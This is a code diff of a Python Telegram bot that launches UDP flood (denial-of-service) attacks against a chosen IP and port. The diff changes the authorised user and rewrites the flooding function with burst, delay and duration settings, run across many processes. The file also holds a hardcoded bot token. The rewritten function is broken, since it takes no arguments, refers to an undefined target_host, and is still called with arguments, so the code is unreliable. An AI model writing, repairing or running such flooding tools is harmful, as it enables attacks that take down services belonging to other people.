@@ -12,27 +12,30 @@ import socket
 
 bot = telebot.TeleBot("7599785141:AAGokC8HZXRhjcvSkzd1jBSsinBoNSEX6NU", threaded=False)
 
-AUTHORIZED_USERS = [7418099890]
+AUTHORIZED_USERS = [6862918172]
 
 #  track of user attacks
 user_attacks = {}
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-def udp_flood(target_ip, target_port, stop_flag):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow socket address reuse
-    while not stop_flag.is_set():
-        try:
-            packet_size = random.randint(512, 4096)  # Random packet size
+# Parameters for attack timing and power
+packet_delay = 0.001  # Delay in seconds between packets (e.g., 0.01 for 10ms delay)
+burst_packets = 2000  # Number of packets sent per burst (increase for more power)
+total_bursts = 500  # Number of bursts (increase for longer attack duration)
+
+# Generate and send multiple packets
+def udp_flood():
+    for _ in range(total_bursts):  # Loop through bursts
+        for _ in range(burst_packets):  # Send burst of packets
+            packet_size = random.randint(64, 1469)  # Random packet size
             data = os.urandom(packet_size)  # Generate random data
-            for _ in range(50000):  # Maximize impact by sending multiple packets
-                sock.sendto(data, (target_ip, target_port))
-        except Exception as e:
-            logging.error(f"Error sending packets: {e}")
-            break
+
+            # Create a socket
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                sock.sendto(data, (target_host, target_port))  # Send the random data packet
 def start_udp_flood(user_id, target_ip, target_port):
     stop_flag = multiprocessing.Event()
     processes = []
-    for _ in range(min(12000, multiprocessing.cpu_count())):
+    for _ in range(min(500, multiprocessing.cpu_count())):
         process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
         process.start()
         processes.append(process)
